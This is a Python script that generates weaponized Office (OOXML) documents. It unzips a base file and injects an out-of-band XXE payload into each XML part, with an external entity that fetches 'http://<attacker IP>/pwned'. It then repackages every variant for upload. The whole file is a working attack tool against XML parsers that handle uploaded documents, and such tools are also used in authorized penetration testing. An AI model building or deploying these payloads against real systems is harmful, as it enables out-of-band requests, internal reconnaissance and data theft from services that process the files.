#!/usr/bin/python3

import os
import zipfile
import sys
import argparse
import magic
import shutil
import platform
import time


def prepare(file):
    os.mkdir('base')

    if zipfile.is_zipfile(file):
        with zipfile.ZipFile(file, 'r') as zipF:
            zipF.extractall(path='base')
    else:
        print('This file type is not supported. Aborting now')
        sys.exit()


def set_payload_positions():
    plat = platform.system()
    if plat == 'Linux':
        positions = os.popen('find base -type f').read()
    elif plat == 'Windows':
        positions = os.popen('powershell -c "Get-ChildItem -File -Recurse | %{$_.FullName} | Resolve-Path -Relative"').read()
    positions = positions.split('\n')
    return positions


def is_xml(file):
    file_type = magic.from_file(file)
    if 'XML' in file_type:
        return True
    else:
        return False


def embed_payload(file, ip):
    payload = "<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM \"http://{}/pwned\">]><r>&sp;</r>".format(ip)
    with open(file, 'r') as f:
        content = f.readlines()
        content = [x.strip() for x in content]
    f.close()

    content.insert(1, payload)

    f = open(file, 'w')
    for line in content:
        f.write(line + '\n')
    f.close()


def compress(path, ziph):
    os.chdir(path)
    for root, dirs, files in os.walk('.'):
        for file in files:
            ziph.write(os.path.join(root, file))
    os.chdir('..')


def main():
    parser = argparse.ArgumentParser(description='Embed XXE payloads into OOXML files')
    
    parser.add_argument('-f', '--file', type=str, metavar='', required=True, help='base file')
    parser.add_argument('-i', '--ip-address', type=str, metavar='', required=True, help='ip address to be placed in payloads (OOB XXE)')
    parser.add_argument('-o', '--out', type=str, metavar='', required=True, help='directory to save output')

    args = parser.parse_args()

    extension = os.path.splitext(args.file)[-1]

    prepare(args.file)
    positions = set_payload_positions()

    out_dir = args.out
    os.mkdir(out_dir)

    for file in positions:
        if os.path.isfile(file):
            if is_xml(file):
                file_name = os.path.basename(file)
                tmp_dir = file_name + '.tmp'
                shutil.copytree('base', tmp_dir)

                new_file_name = str(file).replace('base', tmp_dir)
                embed_payload(new_file_name, args.ip_address)

                output = str(tmp_dir).strip('.tmp').replace('.', '_')
                zipf = zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED)
                compress(tmp_dir, zipf)

                add_ext = output + extension
                time.sleep(1)
                os.rename(output, add_ext)

                shutil.move(add_ext, out_dir)
                shutil.rmtree(tmp_dir)

            else:
                pass
    shutil.rmtree('base')


if __name__ == '__main__':
    main()
